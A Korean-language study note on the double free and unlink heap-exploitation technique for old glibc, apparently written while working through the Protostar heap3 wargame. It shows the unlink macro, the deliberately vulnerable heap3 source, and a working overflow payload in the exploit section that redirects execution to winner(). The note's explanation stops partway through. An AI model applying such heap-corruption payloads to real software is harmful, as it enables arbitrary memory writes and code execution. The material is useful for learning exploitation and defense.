# **Double Free Bug**

Free를 두 번할 경우 발생하는 버그이다.

Free가 호출될 때 인접한 Free Chunk가 있다면 더 큰 Free Chunk로 병합된다.

Chunk가 병합될 때 unlink 매크로가 발생한다. unlink 매크로를 통해 원하는 공간에 원하는 값을 입력할 수 있다.

unlink를 공격하는 방법은 glibc 2.3.2 버전 이하에서만 가능하다.

```c
#define unlink(P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    FD->bk = BK;
    BK->fd = FD;
}
```

```
FD = *P + 8;
BK = *P + 12;
FD + 12 = BK;
BK + 8 = FD;
```

![unlink](/Resources/img/double_free_bug_unlink.jpeg)

## **Proof of Concept**

### **Protostar의 heap3**

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}
int main(int argc, char **argv)
{
  char *a, *b, *c;
  a = malloc(32);
  b = malloc(32);
  c = malloc(32);
  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);
  free(c);
  free(b);
  free(a);
  printf("dynamite failed?\n");
}
```

strcpy(a,argv[1])에서 Overflow를 통해 b의 **P flag**와 **pre_size** 값을 변조한다.  

1. P flag 변조
  * P flag가 0이라는 뜻은 b가 free될 때 a chunk와 병합이 일어난다는 뜻이다. 
  * 따라서 P flag를 0으로 변조시키면 unlink 매크로가 발생한다. 
  * unlink가 실행되면 fd가 가리키는 주소의 + 12 지점에 bk가 입력되고 bk가 가리키는 주소의 + 8 지점에 fd가 입력되어 임의의 주소에 원하는 값을 입력할 수 있다.
1. 



## **Exploit**

```
root@protostar:/home/protostar# ./heap3 $(python -c 'print "\x90"*22+"\x68\x64\x88\x04\x08\xc3"+"A"*4+"\xfc\xff\xff\xff"+"\xfc\xff\xff\xff"') $(python -c 'print "A"*4+"\x1c\xb1\x04\x08"+"\x10\xc0\x04\x08"') C
that wasn't too bad now, was it? @ 1577555750
```

**References**  
<http://index-of.co.uk/Reverse-Engineering/Double%20Free%20Bug%20%5Bseoty-_-v%5D.pdf>  
<https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13>  